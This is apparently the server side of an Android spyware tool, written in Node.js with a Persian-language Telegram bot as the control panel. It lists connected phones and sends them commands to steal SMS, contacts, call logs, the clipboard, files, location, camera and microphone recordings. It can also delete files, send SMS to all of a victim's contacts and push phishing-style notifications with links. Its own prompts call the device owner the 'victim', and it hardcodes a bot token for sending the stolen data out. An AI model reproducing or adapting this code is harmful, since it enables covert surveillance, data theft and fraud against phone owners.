const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '6993201296:AAGrRMaGqVtZN87--iC5nlqWTft_3OIyb3E'
const id = '1279660950'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• دستگاه جدید متصل شد :\n\n` +
        `• مدل دستگاه : <b>${model}</b>\n` +
        `• باتری : <b>${battery}</b>\n` +
        `• نسخه اندروید : <b>${version}</b>\n` +
        `• روشنایی صفحه نمایش : <b>${brightness}</b>\n` +
        `• نوع سیم کارت : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• دستگاه قطع شد\n\n` +
            `• مدل دستگاه : <b>${model}</b>\n` +
            `• باتری : <b>${battery}</b>\n` +
            `• نسخه اندروید : <b>${version}</b>\n` +
            `• روشنایی صفحه نمایش : <b>${brightness}</b>\n` +
            `• نوع سیم کارت : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• لطفا به شماره ای که می خواهید پیامک به آن ارسال کنید وارد کنید')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• حالا پیامی را که می خواهید به این شماره ارسال کنید وارد کنید\n\n' +
                '• مراقب باشید که تعداد کاراکتر پیام شما بیش از حد مجاز نشود',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• حالا پیامی را که می خواهید به این شماره ارسال کنید وارد کنید')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را که می خواهید برای همه مخاطبین ارسال کنید وارد کنید')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مسیر فایلی که می خواهید دانلود کنید را وارد کنید')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مسیر فایلی که می خواهید حذف کنید را وارد کنید')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمان ضبط میکرفون را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی که می خواهید دوربین اصلی ضبط شود را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• مدت زمانی که می خواهید دوربین سلفی ضبط شود را وارد کنید')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را که می خواهید در دستگاه مورد نظر ظاهر شود را وارد کنید')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• پیامی را که می خواهید به عنوان اعلان نمایش داده شود را وارد کنید')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• اکنون لینکی را که می خواهید با اعلان باز شود را وارد کنید\n\n' +
                '• هنگامی که قربانی روی اعلان کلیک بکند پیوندی که وارد می کنید باز می شود',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• اکنون لینکی را که می خواهید با اعلان باز شود را وارد کنید')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• لینک فایل صوتی مورد نظر خود را برای پخش وارد کنید')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• درخواست شما در حال پردازش است\n\n' +
                '• تا لحظاتی دیگر ارسال میشود',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• به پنل کنترل خوش آمدید\n\n' +
                '• بعد از نصب برنامه  بر روی دستگاه مورد نظر، منتظر اتصال باشید\n\n' +
                '• هنگامی که پیام اتصال را دریافت می کنید، به این معنی است که دستگاه مورد نظر متصل است و آماده دریافت فرمان است\n\n' +
                '• بر روی دکمه فرمان کلیک کنید و دستگاه دلخواه را انتخاب کنید و سپس دستور دلخواه را از میان دستور انتخاب کنید\n\n' +
                '• اگر جایی در ربات گیر کردید، دستور شروع را ارسال کنید',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'دستگاه های متصل') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• دستگاه متصلی موجود نیست\n\n' +
                    '• مطمئن شوید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                )
            } else {
                let text = '°• دستگاه جدید متصل شد :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• مدل دستگاه : <b>${value.model}</b>\n` +
                        `• باتری : <b>${value.battery}</b>\n` +
                        `• نسخه اندروید : <b>${value.version}</b>\n` +
                        `• روشنایی صفحه نمایش : <b>${value.brightness}</b>\n` +
                        `• نوع سیم کارت : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'اجرای دستور') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• دستگاه متصلی موجود نیست\n\n' +
                    '• مطمئن شوید که برنامه بر روی دستگاه مورد نظر نصب شده است'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• دستگاه را برای اجرای فرمان انتخاب کنید', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• بدون دسترسی')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• دستور را برای دستگاه انتخاب کنید : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'برنامه ها', callback_data: `apps:${uuid}`},
                        {text: 'اطلاعات دستگاه', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'دریافت فایل', callback_data: `file:${uuid}`},
                        {text: 'حذف فایل', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'صفحه کلید', callback_data: `clipboard:${uuid}`},
                        {text: 'میکرفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'دوربین اصلی', callback_data: `camera_main:${uuid}`},
                        {text: 'دوربین سلفی', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'موقعیت مکانی', callback_data: `location:${uuid}`},
                        {text: 'پیغام انداز', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'تماس ها', callback_data: `calls:${uuid}`},
                        {text: 'مخاطبین', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'ویبره', callback_data: `vibrate:${uuid}`},
                        {text: 'نمایش اعلان', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'پیام ها', callback_data: `messages:${uuid}`},
                        {text: 'ارسال پیام', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'پخش صدا', callback_data: `play_audio:${uuid}`},
                        {text: 'قطع صدا', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'برای همه مخاطبین پیام ارسال کنید',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• درخواست شما در حال پردازش است\n\n' +
            '• تا لحظاتی دیگر ارسال میشود',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["دستگاه های متصل"], ["اجرای دستور"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• لطفا شماره ایی را که می خواهید به آن پیامک ارسال بکنید را وارد کنید\n\n' +
            '•اگر می خواهید به شماره محلی ارسال کنید، می توانید شماره را با صفر در ابتدا وارد کنید، در غیر این صورت شماره را با کد کشور وارد کنید.',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را که می خواهید برای همه مخاطبین ارسال کنید وارد کنید\n\n' +
            '• مراقب باشید که تعداد کاراکتر پیام شما بیش از حد مجاز نشود',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مسیر فایلی که می خواهید دانلود کنید را وارد کنید\n\n' +
            '• شما نیازی به وارد کردن مسیر کامل فایل ندارید، فقط مسیر اصلی را وارد کنید',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مسیر فایلی که می خواهید حذف کنید را وارد کنید\n\n' +
            '• شما نیازی به وارد کردن مسیر کامل فایل ندارید، فقط مسیر اصلی را وارد کنید',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• مدت زمان ضبط میکرفون را وارد کنید\n\n' +
            '•  باید زمان را به صورت عددی بر حسب واحد در ثانیه وارد کنید',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را که می خواهید در دستگاه مورد نظر ظاهر شود را وارد کنید\n\n' +
            '• یک پیام کوتاه که برای چند ثانیه روی صفحه نمایش دستگاه ظاهر می شود',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• پیامی را که می خواهید به عنوان اعلان نمایش داده شود را وارد کنید\n\n' +
            '• پیام شما مانند اعلان معمولی در نوار وضعیت دستگاه مورد نظر ظاهر می شود',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• لینک فایل صوتی مورد نظر خود را برای پخش وارد کنید\n\n' +
            '• توجه داشته باشید که باید لینک مستقیم مورد نظر را وارد کنید در غیر این صورت صدا پخش نمی شود',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);